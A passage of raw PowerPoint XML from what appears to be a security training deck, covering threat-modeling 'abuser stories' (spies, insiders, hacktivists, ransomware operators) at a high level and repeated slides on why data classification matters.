              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>19</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4178737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61AE-0C09-64C5-E93C-C490E17DC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45D21-4383-9FF3-D9C7-437EC15C0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E13B5-04A0-A85C-F4C4-C651DBD5AD15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Real incidents often come from features behaving “as designed,” but used with hostile intent.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{88CFBD27-6025-C3CF-458F-B3F6C0F0940F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>20</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1033938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DC78-46B9-5D76-423B-D4C515C5C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25765-5CE4-4058-032D-57CF2E0DA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F6F52-A699-C370-A444-F3DFD9A7F352}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>More examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>As a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>corporate spy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, I want to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>harvest roadmap details</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> against </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>executive calendars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> by abusing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>over-shared invites</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, so I can </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>front-run product launches</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>As a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>malicious insider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, I want to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>exfiltrate customer data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> against </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>data lakes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> by abusing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>over-broad IAM roles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, so I can </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>sell datasets quietly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>As a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>hacktivist</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, I want to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>deface content</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> against </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>high-profile websites</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> by abusing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>weak CI/CD secrets in repos</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, so I can </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>broadcast a political message</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>As a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>ransomware operator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, I want to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>exfiltrate sensitive archives</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> against </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>backups and NAS devices</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> by abusing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>unsegmented backup networks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, so I can </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>double-extort victims</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8FA1A930-ED5E-C30D-4E38-BCF6CD58EEBB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>21</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3799629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3EB2-D573-0031-CFB3-9BE4BD10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ABB47-66CD-8183-2EFA-38ED17501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9EF03-52B9-480C-F2C4-37F3299839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3E788C-971E-204F-0674-A278C7011E42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>22</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2870898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AECC1-5438-40C5-9D8C-186E2B20D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FC8C4-966B-875C-148B-A0314CADD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59725-8203-C92A-2BA3-6E11198DB47E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why Classify? So you can apply the right protections (access, encryption, retention, monitoring)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why it matters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Focus security spend where risk is highest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Meet legal/regulatory duties (GDPR, HIPAA, PCI DSS, etc.)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prevent accidental leaks and overexposure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enable automation (DLP rules, encryption policies, retention)</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035AF5E3-FA27-6557-3404-9C512858415A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>24</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2714469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12924-FB64-84F0-7A50-815AC64C6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0F38F-22C8-DF2C-8153-F58F24FA5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9648B-291D-DDE8-8272-F91BB76F8F14}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why Classify? So you can apply the right protections (access, encryption, retention, monitoring)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why it matters</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Focus security spend where risk is highest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Meet legal/regulatory duties (GDPR, HIPAA, PCI DSS, etc.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prevent accidental leaks and overexposure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enable automation (DLP rules, encryption policies, retention)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Tip:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>fewest levels you can manage well</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (3–5). Too many labels = nobody uses them correctly.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EBD59FF1-BEC1-BA82-1756-FDBD456E6314}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>25</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="948476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5E62E-4AF7-CD20-154C-8B566A419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3360C-FE57-ABA0-6345-77F310F4F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17EEA-B63B-AB86-4DBC-42A6EF2B0570}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why Classify? So you can apply the right protections (access, encryption, retention, monitoring)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why it matters</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Focus security spend where risk is highest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Meet legal/regulatory duties (GDPR, HIPAA, PCI DSS, etc.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prevent accidental leaks and overexposure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enable automation (DLP rules, encryption policies, retention)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Tip:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>fewest levels you can manage well</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (3–5). Too many labels = nobody uses them correctly.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4882866-9062-A636-CF83-165ECE2C1453}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1838186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3597-8FCA-623F-472F-A6913F663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546A6-8D17-1812-B0B1-2EFE04557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73CCB-54EB-80C8-6E83-48003FFC3F03}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why Classify? So you can apply the right protections (access, encryption, retention, monitoring)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why it matters</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Focus security spend where risk is highest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Meet legal/regulatory duties (GDPR, HIPAA, PCI DSS, etc.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prevent accidental leaks and overexposure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enable automation (DLP rules, encryption policies, retention)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Tip:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>fewest levels you can manage well</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (3–5). Too many labels = nobody uses them correctly.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0340B9F-394F-5EC2-70D9-02F824734125}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>27</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2978871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0EBD4-0508-169A-C601-F4058A5F7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215FA-BFAA-FECE-24BD-D27E9BF9F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7B3F0-9399-756B-40D3-03FC67FE1C61}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why Classify? So you can apply the right protections (access, encryption, retention, monitoring)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why it matters</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Focus security spend where risk is highest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Meet legal/regulatory duties (GDPR, HIPAA, PCI DSS, etc.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prevent accidental leaks and overexposure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enable automation (DLP rules, encryption policies, retention)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Tip:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>fewest levels you can manage well</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (3–5). Too many labels = nobody uses them correctly.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24154E7-0BA0-17F4-903A-D16380C9DBAE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>28</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3272295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854D-D2D4-B7BB-D535-18B768809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438B8-4216-E96A-3D8E-E406A595F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697FA-54C8-B2FE-42A8-9691FABF1E7D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
